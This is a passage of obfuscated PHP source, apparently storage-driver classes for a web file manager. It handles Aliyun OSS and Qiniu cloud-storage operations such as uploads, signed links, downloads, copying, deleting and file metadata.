: $¸¤´„§ú; if ($îŒÆò—÷ == $†Éı³äÂ[1531]) { return $†Éı³äÂ[1530]; } if ($îŒÆò—÷ == $†Éı³äÂ[1532]) { return $†Éı³äÂ[642]; } return $îŒÆò—÷; } private function chmodPath($¥÷¬¦ª, $ôÍ«¨éå = '') { $µòËÙÏ =& $_SERVER[‰‰Ş‚€]; $Çîê™åŠ = empty($ôÍ«¨éå) ? $µòËÙÏ[1532] : $ôÍ«¨éå; $¿ƒé¤´ç = array($µòËÙÏ[47], $µòËÙÏ[240], $µòËÙÏ[1531], $µòËÙÏ[1532]); if (!in_array($Çîê™åŠ, $¿ƒé¤´ç)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¥÷¬¦ª), $Çîê™åŠ); } catch (OSS\Core\OssException $”Øù»£±) { $this->writeLog(__FUNCTION__ . $µòËÙÏ[223] . $”Øù»£±->getMessage()); return !1; } return !0; } public function getContent($Âø—¨Õ¯) { return $this->fileSubstr($Âø—¨Õ¯, -1); } public function setContent($Š›Ø³ˆ–, $¤½¼è‹ä = '') { $ßËÊ£Ÿ¿ =& $_SERVER[‰‰Ş‚€]; try { $àÀûéûì = $this->trafficLimit($ßËÊ£Ÿ¿[1533]); $‚š“Äè© = $this->client->putObject($this->bucket, $this->pathEncode($Š›Ø³ˆ–), $¤½¼è‹ä, $àÀûéûì); } catch (OSS\Core\OssException $§Í¿Á…¤) { $this->writeLog(__FUNCTION__ . $ßËÊ£Ÿ¿[223] . $§Í¿Á…¤->getMessage()); return !1; } $¤¤¥˜… = array($ßËÊ£Ÿ¿[1527] => trim($‚š“Äè©[$ßËÊ£Ÿ¿[1524]], $ßËÊ£Ÿ¿[129]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Š›Ø³ˆ–))); $this->updateObjMeta($Š›Ø³ˆ–, $¤¤¥˜…); return isset($‚š“Äè©[$ßËÊ£Ÿ¿[1534]][$ßËÊ£Ÿ¿[304]]) ? !0 : !1; } private function updateObjMeta($÷Ìó¹Ÿ, $Àò¸ŸÓÚ) { $÷Ìó¹Ÿ = $this->pathEncode($÷Ìó¹Ÿ); try { $ÍƒÙşğ´ = array(OSS\OssClient::OSS_HEADERS => $Àò¸ŸÓÚ); $this->client->copyObject($this->bucket, $÷Ìó¹Ÿ, $this->bucket, $÷Ìó¹Ÿ, $ÍƒÙşğ´); } catch (OSS\Core\OssException $¥›Òú©·) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][223] . $¥›Òú©·->getMessage()); return !1; } return !0; } public function upload($ç×ìêíÅ, $Î•Êœ‡º, $«°Ë˜«… = false, $Ä¼ÜşÑ = REPEAT_REPLACE) { $³“”«²µ =& $_SERVER[‰‰Ş‚€]; $‘ÄÁ‡ªÖ = trim($ç×ìêíÅ, $³“”«²µ[18]); $¤¿üÕ–€ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($³“”«²µ[1527] => @md5_file($Î•Êœ‡º)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ç×ìêíÅ))); $¤¿üÕ–€ = $this->trafficLimit($³“”«²µ[1533], $¤¿üÕ–€); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($‘ÄÁ‡ªÖ), $Î•Êœ‡º, $¤¿üÕ–€); } catch (OSS\Core\OssException $è§÷ù‰›) { $this->writeLog(__FUNCTION__ . $³“”«²µ[223] . $è§÷ù‰›->getMessage()); return !1; } return $this->getPathOuter($ç×ìêíÅ); } public function getHost() { $«ñÈÊ¡¦ =& $_SERVER[‰‰Ş‚€]; $’ê¢£å = explode($«ñÈÊ¡¦[219], parent::getHost()); return $’ê¢£å[0] . $«ñÈÊ¡¦[219] . $this->bucket . $«ñÈÊ¡¦[20] . $’ê¢£å[1]; } public function uploadFormData($÷å÷ß…, $±şí›ÛÀ = 3600) { $Éİãíì =& $_SERVER[‰‰Ş‚€]; if (!($âãÀ±ëÔ = $this->getHost())) { return !1; } $Šå‡ãğ = $±şí›ÛÀ; $ ¢ÍƒÏÙ = date($Éİãíì[1535], time() + $Šå‡ãğ); $ãÜÃîáô = new DateTime($ ¢ÍƒÏÙ); $ÈŠä¼‘’ = $ãÜÃîáô->format(DateTime::ISO8601); $ç°ÄöÕ§ = strpos($ÈŠä¼‘’, $Éİãíì[380]); $ÈŠä¼‘’ = substr($ÈŠä¼‘’, 0, $ç°ÄöÕ§) . $Éİãíì[1536]; $åì“Áì = 1048576000 * 5; $¨ÕÕÔ = $this->pathFather($÷å÷ß…); $¹óĞı¤ù = array($Éİãíì[273] => $ÈŠä¼‘’, $Éİãíì[276] => array(array($Éİãíì[1537], 0, $åì“Áì), array($Éİãíì[278], $Éİãíì[279], $¨ÕÕÔ))); $‚â¹‹½« = base64_encode(json_encode($¹óĞı¤ù)); $šä¯ŸÓ = base64_encode(hash_hmac($Éİãíì[1458], $‚â¹‹½«, $this->secret, !0)); $Æµ¼¢À‹ = array($Éİãíì[1538] => $this->accessKey, $Éİãíì[288] => $‚â¹‹½«, $Éİãíì[281] => $Éİãíì[272], $Éİãíì[1539] => $šä¯ŸÓ, $Éİãíì[217] => $âãÀ±ëÔ); $Æµ¼¢À‹ = $this->trafficLimit($Éİãíì[1533], $Æµ¼¢À‹, !0); return $Æµ¼¢À‹; } public function uploadMultiData($Ï‡ÛåÂî, $½º¥ß© = 3600) { $©îù’Ó» =& $_SERVER[‰‰Ş‚€]; if (!($¿›„ô¥§ = $this->getHost())) { return !1; } $¬Å²ŒÍ­ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ï‡ÛåÂî)); return array($©îù’Ó»[292] => $¬Å²ŒÍ­, $©îù’Ó»[217] => $¿›„ô¥§ . $©îù’Ó»[18] . $this->pathEncode($Ï‡ÛåÂî), $©îù’Ó»[293] => gmdate($©îù’Ó»[1540]), $©îù’Ó»[105] => $Ï‡ÛåÂî); } public function uploadMultiAuth($˜í™ÓÆ, $ßÏœ´³š = array()) { if (isset($ßÏœ´³š[$_SERVER[‰‰Ş‚€][294]])) { return $this->uploadPartAuth($˜í™ÓÆ, $ßÏœ´³š); } return $this->uploadListAuth($˜í™ÓÆ, $ßÏœ´³š); } private function uploadPartAuth($ ­İØµ’, $ñ‡—Ğôİ = array()) { $»ú¬”¡‡ =& $_SERVER[‰‰Ş‚€]; $»‰ª’º” = $ñ‡—Ğôİ[$»ú¬”¡‡[105]]; $¨Ü£²Š£ = $this->_getUploadAuth($»‰ª’º”, $ñ‡—Ğôİ); $²œóÈÚó = array($»ú¬”¡‡[296] => $¨Ü£²Š£[$»ú¬”¡‡[296]], $»ú¬”¡‡[293] => $¨Ü£²Š£[$»ú¬”¡‡[293]]); if (isset($¨Ü£²Š£[$»ú¬”¡‡[1541]])) { $²œóÈÚó[$»ú¬”¡‡[1541]] = $¨Ü£²Š£[$»ú¬”¡‡[1541]]; } return $²œóÈÚó; } private function uploadListAuth($˜ßÉ»¢Ì, $ ©•¡¤ = array()) { $µÅ´±ñã =& $_SERVER[‰‰Ş‚€]; $˜À§¼¥ª = $ ©•¡¤[$µÅ´±ñã[105]]; $úÃŒ•È = $ ©•¡¤[$µÅ´±ñã[292]]; $§æ¨³äµ = $this->client->listParts($this->bucket, $this->pathEncode($˜À§¼¥ª), $úÃŒ•È); $Íº¬ä¿š = $§æ¨³äµ->getListPart(); $Íö‚µç‘ = array(); foreach ($Íº¬ä¿š as $¥‚Ï€úÑ) { $Íö‚µç‘[] = array($µÅ´±ñã[307] => $¥‚Ï€úÑ->getPartNumber(), $µÅ´±ñã[308] => trim($¥‚Ï€úÑ->getETag(), $µÅ´±ñã[129])); } if (!$Íö‚µç‘) { return !1; } $¯Â®”×é = $this->_getUploadAuth($˜À§¼¥ª, $ ©•¡¤); return array($µÅ´±ñã[296] => $¯Â®”×é[$µÅ´±ñã[296]], $µÅ´±ñã[293] => $¯Â®”×é[$µÅ´±ñã[293]], $µÅ´±ñã[299] => $Íö‚µç‘); } private function _getUploadAuth($£“ÆîºÏ, $šô·Û¤Ü) { $·ÆşªÊ =& $_SERVER[‰‰Ş‚€]; $†á£¯÷ = gmdate($·ÆşªÊ[1540]); $±ÚÈáå­ = isset($šô·Û¤Ü[$·ÆşªÊ[294]]) ? $·ÆşªÊ[264] : $·ÆşªÊ[298]; $«¥ƒƒÏš = array_intersect_key($šô·Û¤Ü, array_flip(array($·ÆşªÊ[294], $·ÆşªÊ[292]))); ksort($«¥ƒƒÏš); $›Óï­ç  = $«¥ƒƒÏš ? $·ÆşªÊ[86] . http_build_query($«¥ƒƒÏš, null, $·ÆşªÊ[295], PHP_QUERY_RFC3986) : $·ÆşªÊ[22]; $Ÿ¤Áü“½ = array($±ÚÈáå­, $·ÆşªÊ[22], $·ÆşªÊ[131], $†á£¯÷, "\x78\55\157\163\163\55\144\141\x74\x65\x3a{$†á£¯÷}", $·ÆşªÊ[18] . $this->bucket . $·ÆşªÊ[18] . $£“ÆîºÏ . $›Óï­ç ); if (isset($šô·Û¤Ü[$·ÆşªÊ[294]])) { $¼Áš‹¢ = $this->trafficLimit($·ÆşªÊ[1533], array(), !0); if ($¼Áš‹¢) { $£“ÆîºÏ = $·ÆşªÊ[1541]; array_splice($Ÿ¤Áü“½, 5, 0, $£“ÆîºÏ . $·ÆşªÊ[14] . $¼Áš‹¢[$£“ÆîºÏ]); } } $Ó¤’¯Ğ = implode($·ÆşªÊ[10], $Ÿ¤Áü“½); $‚óûÆºı = base64_encode(hash_hmac($·ÆşªÊ[1458], $Ó¤’¯Ğ, $this->secret, !0)); $•œ¦’‹Í = $·ÆşªÊ[1510] . $this->accessKey . $·ÆşªÊ[14] . $‚óûÆºı; $Û›Íª÷è = array($·ÆşªÊ[296] => $•œ¦’‹Í, $·ÆşªÊ[293] => $†á£¯÷); if (!empty($¼Áš‹¢)) { $Û›Íª÷è = array_merge($Û›Íª÷è, $¼Áš‹¢); } return $Û›Íª÷è; } public function download($ÃÜê€„, $’¦Öú¹) { $‚ ÌÎæ =& $_SERVER[‰‰Ş‚€]; if ($this->isFolder($ÃÜê€„)) { return !1; } try { $¾äËòŸû = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $’¦Öú¹); $¾äËòŸû = $this->trafficLimit($‚ ÌÎæ[120], $¾äËòŸû); $this->client->getObject($this->bucket, $this->pathEncode($ÃÜê€„), $¾äËòŸû); } catch (OSS\Core\OssException $§¹¿€½é) { $this->writeLog(__FUNCTION__ . $‚ ÌÎæ[223] . $§¹¿€½é->getMessage()); return !1; } return $’¦Öú¹; } public function fileSubstr($àÄœ›ƒ, $“©ë×Ê = 0, $Ï¼È‰ËÒ = false) { if ($“©ë×Ê === -1) { $ŸÜûùÔ– = array(); } else { if ($Ï¼È‰ËÒ === !1) { $³–Â‰“Ô = $this->size($àÄœ›ƒ); } else { $³–Â‰“Ô = $“©ë×Ê + $Ï¼È‰ËÒ - 1; } $ŸÜûùÔ– = array(OSS\OssClient::OSS_RANGE => "{$“©ë×Ê}\55{$³–Â‰“Ô}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($àÄœ›ƒ), $ŸÜûùÔ–); } catch (OSS\Core\OssException $¤•ïù¨Í) { $this->writeLog(__FUNCTION__ . $_SERVER[‰‰Ş‚€][223] . $¤•ïù¨Í->getMessage()); think_exception($¤•ïù¨Í->getMessage()); return !1; } } private function trafficLimit($±½ÅµÊÂ, $£µ€Ş”ë = array(), $Ûü¾û = false) { $·ñ =& $_SERVER[‰‰Ş‚€]; if ($±½ÅµÊÂ == $·ñ[1533] && $this->isUploadServer() || $±½ÅµÊÂ == $·ñ[120] && $this->isFileOutServer()) { return $£µ€Ş”ë; } $ªÄ ‰İ» = floatval($GLOBALS[$·ñ[16]][$·ñ[102]][$·ñ[118]][$±½ÅµÊÂ]) * 1024 * 1024 * 8; if (!$ªÄ ‰İ») { return $£µ€Ş”ë; } $ªÄ ‰İ» = $ªÄ ‰İ» < 819200 ? 819200 : ($ªÄ ‰İ» > 838860800 ? 838860800 : $ªÄ ‰İ»); if ($Ûü¾û) { $£µ€Ş”ë[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ªÄ ‰İ»); } else { if (!isset($£µ€Ş”ë[OSS\OssClient::OSS_HEADERS])) { $£µ€Ş”ë[OSS\OssClient::OSS_HEADERS] = array(); } $£µ€Ş”ë[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ªÄ ‰İ»); } return $£µ€Ş”ë; } public function link($Ó•™§ËÖ, $µÓõäƒÛ = array()) { $³Ø¿«ÆŠ =& $_SERVER[‰‰Ş‚€]; if (!$this->exist($Ó•™§ËÖ) || $this->isFolder($Ó•™§ËÖ)) { return !1; } try { $µÓõäƒÛ = $this->trafficLimit($³Ø¿«ÆŠ[120], $µÓõäƒÛ, !0); $ú˜„Ïñ³ = $this->client->signUrl($this->bucket, $this->pathEncode($Ó•™§ËÖ), 3600 * 12, $³Ø¿«ÆŠ[1542], $µÓõäƒÛ); return $this->getCdnLink($ú˜„Ïñ³); } catch (OSS\Core\OssException $¸¹ÍØ•ù) { $this->writeLog(__FUNCTION__ . $³Ø¿«ÆŠ[223] . $¸¹ÍØ•ù->getMessage()); return !1; } } public function fileOut($¤Ä¡ö…, $Øİ«ä = false, $È÷‚šß• = false, $ß†‘çÖ = '') { $é†¾üôò =& $_SERVER[‰‰Ş‚€]; if ($this->isFileOutServer()) { return $this->fileOutServer($¤Ä¡ö…, $Øİ«ä, $È÷‚šß•, $ß†‘çÖ); } if (!$È÷‚šß•) { $È÷‚šß• = $this->pathThis($¤Ä¡ö…); } $È÷‚šß• = rawurlencode($È÷‚šß•); $ªùş»¶İ = get_file_mime(get_path_ext($È÷‚šß•)); if ($ªùş»¶İ == $é†¾üôò[259]) { return parent::fileOut($¤Ä¡ö…, $Øİ«ä, $È÷‚šß•, $ß†‘çÖ); } $Øİ«ä = $Øİ«ä ? $é†¾üôò[1543] : $é†¾üôò[1544]; $Ëš´”Ø = array(OSS\OssClient::OSS_SUB_RESOURCE => $é†¾üôò[1545] . rawurlencode("{$Øİ«ä}\73\x66\x69\154\145\156\x61\155\x65\75{$È÷‚šß•}")); $úÄ‡­–é = $this->link($¤Ä¡ö…, $Ëš´”Ø); $this->fileOutLink($úÄ‡­–é); } public function fileOutServer($Æ°ŸÖñ, $ï²Èğ½• = false, $äæÈ•Ìã = false, $ŸÁ¿˜„Â = '') { parent::fileOut($Æ°ŸÖñ, $ï²Èğ½•, $äæÈ•Ìã, $ŸÁ¿˜„Â); } public function fileOutImage($¾®ßº¤, $Ğº×õ¬ = 250) { if ($this->size($¾®ßº¤) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¾®ßº¤, $Ğº×õ¬); } $¨¥ä¦ğ‘ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[‰‰Ş‚€][1507] . $Ğº×õ¬); $‰¾íÉûº = $this->link($¾®ßº¤, $¨¥ä¦ğ‘); $this->fileOutLink($‰¾íÉûº); } public function fileOutImageServer($öüõî®, $ìä¨ğİÈ = 250) { parent::fileOutImage($öüõî®, $ìä¨ğİÈ); } public function fileOutLink($×Ù“æ) { $¾½ú¦Öğ =& $_SERVER[‰‰Ş‚€]; if (!$this->isCdnHost() && substr($×Ù“æ, 0, 7) == $¾½ú¦Öğ[227]) { $×Ù“æ = $¾½ú¦Öğ[228] . substr($×Ù“æ, 7); } header($¾½ú¦Öğ[183] . $×Ù“æ); die; } public function hashMd5($÷ İ¬“¿, $Œ–Š…œ„ = '') { $–º•Îøı =& $_SERVER[‰‰Ş‚€]; $º­à÷íë = $this->_objectMeta($÷ İ¬“¿); if (!$º­à÷íë) { return $–º•Îøı[22]; } if (!isset($º­à÷íë[$–º•Îøı[1527]]) && !empty($Œ–Š…œ„)) { $äÙÜ¯Ë = $this->updateObjMeta($÷ İ¬“¿, array($–º•Îøı[1527] => $Œ–Š…œ„)); $º­à÷íë[$–º•Îøı[1527]] = $äÙÜ¯Ë ? $Œ–Š…œ„ : $–º•Îøı[22]; } return isset($º­à÷íë[$–º•Îøı[1527]]) ? strtolower($º­à÷íë[$–º•Îøı[1527]]) : $–º•Îøı[22]; } public function size($½Ãá‘š‹) { $¾÷ƒ´¢À = $this->objectMeta($½Ãá‘š‹); return $¾÷ƒ´¢À ? $¾÷ƒ´¢À[$_SERVER[‰‰Ş‚€][89]] : 0; } public function info($ş½ÂÆ±”) { if ($this->isFolder($ş½ÂÆ±”)) { return $this->folderInfo($ş½ÂÆ±”); } else { if ($this->isFile($ş½ÂÆ±”)) { return $this->fileInfo($ş½ÂÆ±”); } } return !1; } public function exist($£æ­ê‡•) { return $this->isFile($£æ­ê‡•) || $this->isFolder($£æ­ê‡•); } public function isFile($­ú´Äê©) { return !$this->isFolder($­ú´Äê©) && $this->objectMeta($­ú´Äê©); } public function isFolder($ÁËŒåáè) { return $this->cacheMethod($_SERVER[‰‰Ş‚€][188], $ÁËŒåáè); } protected function objectMeta($©…‚È“Ï) { return $this->cacheMethod($_SERVER[‰‰Ş‚€][190], $©…‚È“Ï); } protected function _objectMeta($ıÚê±ş”) { $”Á¹ˆíª =& $_SERVER[‰‰Ş‚€]; try { $ğ¶›…¡³ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ıÚê±ş”)); } catch (OSS\Core\OssException $¥ÏÁ¥çÇ) { $this->writeLog(__FUNCTION__ . $”Á¹ˆíª[223] . $¥ÏÁ¥çÇ->getMessage()); $ğ¶›…¡³ = !1; } if ($ğ¶›…¡³) { $ğ¶›…¡³[$”Á¹ˆíª[89]] = intval($ğ¶›…¡³[$”Á¹ˆíª[1525]]); } return $ğ¶›…¡³; } protected function _isFolder($şÎØşºÛ) { $÷ˆ‡©Ûß =& $_SERVER[‰‰Ş‚€]; if ($şÎØşºÛ == $÷ˆ‡©Ûß[22] || $şÎØşºÛ == $÷ˆ‡©Ûß[18]) { return !0; } $Úî…¯–‡ = array($÷ˆ‡©Ûß[1520] => $÷ˆ‡©Ûß[18], $÷ˆ‡©Ûß[1521] => rtrim($şÎØşºÛ, $÷ˆ‡©Ûß[18]) . $÷ˆ‡©Ûß[18], $÷ˆ‡©Ûß[1522] => 1, $÷ˆ‡©Ûß[1523] => $÷ˆ‡©Ûß[22]); $´è”—Ô‡ = $this->client->listObjects($this->bucket, $Úî…¯–‡); if ($´è”—Ô‡->getObjectList() || $´è”—Ô‡->getPrefixList()) { return !0; } return !1; } public function writeLog($Äîíî¶ = '', $’¥–‘”œ = false) { $ÈÛ²‰ú =& $_SERVER[‰‰Ş‚€]; $ç“Ì·¢ = in_array(ACTION, array($ÈÛ²‰ú[221], $ÈÛ²‰ú[222])); if (!$ç“Ì·¢ && !GLOBAL_DEBUG) { return; } $şş‚ÃÃ = 0; if (stripos($Äîíî¶, $ÈÛ²‰ú[1546]) !== !1) { $şş‚ÃÃ = 1; $õ¯“€ = explode($ÈÛ²‰ú[1547], $Äîíî¶); $Äîíî¶ = !empty($õ¯“€[1]) ? $õ¯“€[1] : $Äîíî¶; } else { if (stripos($Äîíî¶, $ÈÛ²‰ú[1548])) { $şş‚ÃÃ = 2; $õ¯“€ = explode($ÈÛ²‰ú[1548], $Äîíî¶); $õ¯“€ = explode($ÈÛ²‰ú[14], $õ¯“€[0]); $Äîíî¶ = !empty($õ¯“€[1]) ? $õ¯“€[1] : $Äîíî¶; } } if ($ç“Ì·¢ && I18n::getType() == $ÈÛ²‰ú[1549]) { if ($şş‚ÃÃ == 1) { $Äîíî¶ = str_replace($ÈÛ²‰ú[1550], $ÈÛ²‰ú[1551], $Äîíî¶); } else { if ($şş‚ÃÃ == 2) { $õ¯“€ = explode($ÈÛ²‰ú[223], $õ¯“€[0]); $®‚¯ÇÎ = isset($õ¯“€[1]) ? $õ¯“€[1] : $ÈÛ²‰ú[22]; $¢õÄÓ¦ = array($ÈÛ²‰ú[1552] => $ÈÛ²‰ú[1553], $ÈÛ²‰ú[1554] => $ÈÛ²‰ú[1555], $ÈÛ²‰ú[1556] => $ÈÛ²‰ú[1557], $ÈÛ²‰ú[1558] => $ÈÛ²‰ú[1559], $ÈÛ²‰ú[1560] => $ÈÛ²‰ú[1561], $ÈÛ²‰ú[1562] => $ÈÛ²‰ú[1563], $ÈÛ²‰ú[1564] => $ÈÛ²‰ú[1565], $ÈÛ²‰ú[1566] => $ÈÛ²‰ú[1567], $ÈÛ²‰ú[1568] => $ÈÛ²‰ú[1569], $ÈÛ²‰ú[1570] => $ÈÛ²‰ú[1571]); if (isset($¢õÄÓ¦[$®‚¯ÇÎ])) { $Äîíî¶ = $¢õÄÓ¦[$®‚¯ÇÎ]; } } } if (stripos($Äîíî¶, $ÈÛ²‰ú[1572])) { $Äîíî¶ = $ÈÛ²‰ú[1573]; } } if (!trim($Äîíî¶)) { return; } parent::writeLog(trim($Äîíî¶), $’¥–‘”œ); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¹ÑìÈ½š) { parent::__construct(); require_once SDK_DIR . $_SERVER[‰‰Ş‚€][1574]; $this->_init($¹ÑìÈ½š); } public function _init($ñıµäŠ) { $¸â•¼‘ =& $_SERVER[‰‰Ş‚€]; $this->config = $ñıµäŠ; foreach ($ñıµäŠ as $ÖØ—Ç»˜ => $Ü©¼ûñ) { if (isset($this->{$ÖØ—Ç»˜})) { $this->{$ÖØ—Ç»˜} = $Ü©¼ûñ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¸â•¼‘[1575] . LNG($¸â•¼‘[1511])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($šÊá„õ½, $©›ËÔßˆ = '', $î±“½¯ = REPEAT_RENAME) { if ($this->setContent($šÊá„õ½, $©›ËÔßˆ)) { return $this->getPathOuter($šÊá„õ½); } return !1; } public function mkdir($“ÚŒ“¸“, $™Üü”Âş = REPEAT_SKIP) { $ºÊß«Ù  =& $_SERVER[‰‰Ş‚€]; $¡úçíÛ‘ = trim($“ÚŒ“¸“, $ºÊß«Ù [18]); if ($this->_isFolder($¡úçíÛ‘)) { return $this->getPathOuter($¡úçíÛ‘); } $“ÚŒ“¸“ = $¡úçíÛ‘ . $ºÊß«Ù [18]; $À·ô§Œ = get_path_this($¡úçíÛ‘); $ÔôÄ¹¬« = $“ÚŒ“¸“ . $À·ô§Œ; if (!$this->mkfile($ÔôÄ¹¬«)) { return !1; } if (!$this->moveFile($ÔôÄ¹¬«, $“ÚŒ“¸“)) { $this->delFile($ÔôÄ¹¬«); return !1; } return $this->getPathOuter($¡úçíÛ‘); } public function copyFile($ã¬™¤Ä‘, $õŒ‡ÂÆÎ) { $ßÍå‡ğà = $this->bucketManager->copy($this->bucket, $ã¬™¤Ä‘, $this->bucket, $õŒ‡ÂÆÎ, !0); return $ßÍå‡ğà ? !1 : $this->getPathOuter($õŒ‡ÂÆÎ); } public function moveFile($Ü²©ø, $¼¢±¦—š) { $ŠÖºÆ„Á = $this->bucketManager->move($this->bucket, $Ü²©ø, $this->bucket, $¼¢±¦—š, !0); return $ŠÖºÆ„Á ? !1 : $this->getPathOuter($¼¢±¦—š); } public function delFile($µ£“†ª) { if (!$this->exist($µ£“†ª)) { return !0; } $è÷ì¶…ù = $this->bucketManager->delete($this->bucket, $µ£“†ª); if (!$è÷ì¶…ù) { return !0; } return $è÷ì¶…ù->code() == 612 ? !0 : !1; } public function delFolder($—ßÎÖ×¯) { $ü×‰ıÑˆ =& $_SERVER[‰‰Ş‚€]; if (!$this->exist($—ßÎÖ×¯)) { return !0; } $this->listItemCache = !1; $¾§Ê¹«¾ = $this->fileList($—ßÎÖ×¯); $this->listItemCache = !0; $¨Û¹ˆ×æ = trim($—ßÎÖ×¯, $ü×‰ıÑˆ[18]) . $ü×‰ıÑˆ[18]; if (!empty($—ßÎÖ×¯) && $—ßÎÖ×¯ !== $ü×‰ıÑˆ[239] && !in_array($¨Û¹ˆ×æ, $¾§Ê¹«¾[$ü×‰ıÑˆ[95]])) { $¾§Ê¹«¾[$ü×‰ıÑˆ[95]][] = $¨Û¹ˆ×æ; } $¨£ÜÛÛÛ = $this->delByBatch($¾§Ê¹«¾[$ü×‰ıÑˆ[96]]); if (!$¨£ÜÛÛÛ) { return !1; } $¨£ÜÛÛÛ = $this->delByBatch($¾§Ê¹«¾[$ü×‰ıÑˆ[95]]); if (!$¨£ÜÛÛÛ) { return !1; } return $this->delFile($¨Û¹ˆ×æ); } private function delByBatch($è¡ü¢À) { foreach (array_chunk($è¡ü¢À, 1000) as $ÆŸÅòÖë) { $´ºÚ³‹› = $this->bucketManager->buildBatchDelete($this->bucket, $ÆŸÅòÖë); list($ó²®š¤é, $Ãñô•§) = $this->bucketManager->batch($´ºÚ³‹›); if ($Ãñô•§) { return !1; } } return !0; } public function rename($ªô ¥, $¨‹‹æ¹) { return $this->renameObject($ªô ¥, $¨‹‹æ¹); } public function fileInfo($Û’Æ§§‡, $šœ·ÃÖÎ = false, $ë¥è£ì = array()) { $ï‘³ÄËÙ =& $_SERVER[‰‰Ş‚€]; $«µ²€§Ô = array($ï‘³ÄËÙ[42] => $this->pathThis($Û’Æ§§‡), $ï‘³ÄËÙ[97] => $this->getPathOuter($ï‘³ÄËÙ[18] . $Û’Æ§§‡), $ï‘³ÄËÙ[43] => $ï‘³ÄËÙ[241], $ï‘³ÄËÙ[89] => isset($ë¥è£ì[$ï‘³ÄËÙ[1576]]) ? $ë¥è£ì[$ï‘³ÄËÙ[1576]] : 0, $ï‘³ÄËÙ[177] => $this->ext($Û’Æ§§‡)); if ($šœ·ÃÖÎ) { return $«µ²€§Ô; } $«µ²€§Ô[$ï‘³ÄËÙ[242]] = $«µ²€§Ô[$ï‘³ÄËÙ[98]] = 0; $«µ²€§Ô[$ï‘³ÄËÙ[243]] = $«µ²€§Ô[$ï‘³ÄËÙ[244]] = !0; if (empty($ë¥è£ì)) { $ë¥è£ì = $this->objectMeta($Û’Æ§§‡); if (!$ë¥è£ì) { return $«µ²€§Ô; } } if (isset($ë¥è£ì[$ï‘³ÄËÙ[245]]) && $ë¥è£ì[$ï‘³ÄËÙ[245]]) { $«µ²€§Ô[$ï‘³ÄËÙ[246]] = $ë¥è£ì[$ï‘³ÄËÙ[245]]; } if (isset($ë¥è£ì[$ï‘³ÄËÙ[256]]) && $ë¥è£ì[$ï‘³ÄËÙ[256]]) { $«µ²€§Ô[$ï‘³ÄËÙ[246]] = $ë¥è£ì[$ï‘³ÄËÙ[256]]; } if (isset($ë¥è£ì[$ï‘³ÄËÙ[1577]])) { $«µ²€§Ô[$ï‘³ÄËÙ[98]] = substr($ë¥è£ì[$ï‘³ÄËÙ[1577]] . $ï‘³ÄËÙ[22], 0, 10); } if (isset($ë¥è£ì[$ï‘³ÄËÙ[1576]])) { $«µ²€§Ô[$ï‘³ÄËÙ[89]] = $ë¥è£ì[$ï‘³ÄËÙ[1576]]; } return $«µ²€§Ô; } public function folderInfo($ëî˜çÙï, $ƒ³¾¥»ğ = false) { $ºÎÔÈì =& $_SERVER[‰‰Ş‚€]; $è´×£Üï = array($ºÎÔÈì[42] => $this->pathThis($ëî˜çÙï), $ºÎÔÈì[97] => $this->getPathOuter($ºÎÔÈì[18] . $ëî˜çÙï), $ºÎÔÈì[43] => $ºÎÔÈì[88]); if ($ƒ³¾¥»ğ) { return $è´×£Üï; } $è´×£Üï[$ºÎÔÈì[242]] = $è´×£Üï[$ºÎÔÈì[98]] = 0; $è´×£Üï[$ºÎÔÈì[243]] = $è´×£Üï[$ºÎÔÈì[244]] = !0; $ëî˜çÙï = rtrim($ëî˜çÙï, $ºÎÔÈì[18]) . $ºÎÔÈì[18]; $ò€ÚÎü® = $this->objectMeta($ëî˜çÙï); if (isset($ò€ÚÎü®[$ºÎÔÈì[1577]])) { $è´×£Üï[$ºÎÔÈì[98]] = substr($ò€ÚÎü®[$ºÎÔÈì[1577]] . $ºÎÔÈì[22], 0, 10); } return $è´×£Üï; } public function listPath($×€È·ï¬, $û¶ëŒ“û = false) { $Õ›“ÂêÄ =& $_SERVER[‰‰Ş‚€]; $¹â­Ïè¹ = $this->fileList($×€È·ï¬, $Õ›“ÂêÄ[18], !0); foreach ($¹â­Ïè¹[$Õ›“ÂêÄ[95]] as $µ÷º®ÓÙ => $Ö®‚ı–Ğ) { $¹â­Ïè¹[$Õ›“ÂêÄ[95]][$µ÷º®ÓÙ] = $this->folderInfo($Ö®‚ı–Ğ, $û¶ëŒ“û); } foreach ($¹â­Ïè¹[$Õ›“ÂêÄ[96]] as $µ÷º®ÓÙ => $Ö®‚ı–Ğ) { $¹â­Ïè¹[$Õ›“ÂêÄ[96]][$µ÷º®ÓÙ] = $this->fileInfo($Ö®‚ı–Ğ[$Õ›“ÂêÄ[42]], $û¶ëŒ“û, $Ö®‚ı–Ğ); } return $¹â­Ïè¹; } public function has($—ÑÛ±œ¬, $‡çÍÆ·Ñ = false, $¤óûûÚ¶ = true) { $„Œ‹ÎîÒ =& $_SERVER[‰‰Ş‚€]; $—ÑÛ±œ¬ = trim($—ÑÛ±œ¬, $„Œ‹ÎîÒ[18]); 